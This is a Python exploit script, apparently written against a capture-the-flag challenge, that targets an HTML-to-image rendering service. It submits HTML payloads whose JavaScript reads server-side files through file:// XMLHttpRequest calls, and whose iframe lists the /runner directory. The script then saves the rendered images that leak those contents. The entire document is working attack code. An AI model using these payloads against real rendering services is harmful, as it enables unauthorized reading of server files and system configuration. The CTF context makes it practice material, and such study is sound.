import requests, io, zipfile, time

BASE = 'http://fad4fa65501e0c52f811e82ff7b1afca.playat.flagyard.com'

def render(html, name):
    s = requests.Session(); s.headers.update({'User-Agent':'Mozilla/5.0'})
    for _ in range(2):
        try:
            r = s.post(BASE+'/html-to-image', json={'pages':[html]}, timeout=60)
            if r.status_code==200 and 'zip' in r.headers.get('Content-Type',''):
                z=zipfile.ZipFile(io.BytesIO(r.content))
                for n in z.namelist():
                    open(f'f:/mission-git-hackss/mission-git-hackss/go_{name}.jpg','wb').write(z.read(n))
                    print(f'{name}: {len(z.read(n))} OK')
                return True
            print(f'{name}: [{r.status_code}] {r.text[:120]}'); return False
        except Exception: time.sleep(2)
    return False

def xhr(path):
    return f'<!doctype html><html><body style="font:13px monospace;white-space:pre-wrap;word-break:break-all"><div id=o>x</div><script>var x=new XMLHttpRequest();try{{x.open("GET","file://{path}",false);x.send();document.getElementById("o").textContent=x.responseText||("E:"+x.status);}}catch(e){{document.getElementById("o").textContent="ERR:"+e;}}</script></body></html>'

# re-read render port
render(xhr('/bridge/render_port'), 'port')
time.sleep(1)
# list /runner via iframe (fresh instance - test)
render('<iframe src="file:///runner/" style="width:1250px;height:1200px;border:0"></iframe>', 'runnerls')
